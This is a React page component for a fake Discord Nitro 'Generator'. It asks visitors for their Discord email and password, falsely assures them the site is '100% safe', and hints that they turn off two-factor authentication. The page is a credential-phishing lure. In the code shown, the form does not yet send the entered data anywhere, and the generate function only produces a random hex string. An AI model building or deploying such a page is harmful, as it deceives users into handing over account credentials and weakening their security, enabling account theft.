export default function Page() {
    return (
        <>
		<div className="bg-gray-800/50 border border-white/5 p-10 m-12 rounded-lg grid place-items-center">
			<h1 className="text-6xl font-bold">
				Generator
			</h1>
		</div>
        <div className="bg-gray-800/50 border border-white/5 p-10 m-12 rounded-lg grid place-items-center">
            <h5 className="text-2xl font-light">
				We will need your Discord login information to apply the codes into your account with Discord's API.
			</h5>
            <input type="email" placeholder="Email" name="Email" className="rounded-lg bg-white/10 p-2 my-2 text-xl" />
            <input type="password" placeholder="Password" name="Email" className="rounded-lg bg-white/10 p-2 my-2 text-xl" />
            <a className="p-3 mt-2 bg-black/30 text-2xl rounded-2xl shadow-md hover:shadow-xl hover:bg-[#2e70db] transition-all duration-200" href="/generating">
				Submit
			</a>
            <p className="text-md font-light pt-10">
				We do not store ANY personal info. We are 100% safe with your information. If you feel unsafe then you may reset your password after you get the Nitro. And you should probably re-enable 2FA if after you get the Nitro.
			</p>
		</div>
        </>
    )
}

function generate() {
    let code1 = Math.floor(Math.random()*16777215).toString(16);
}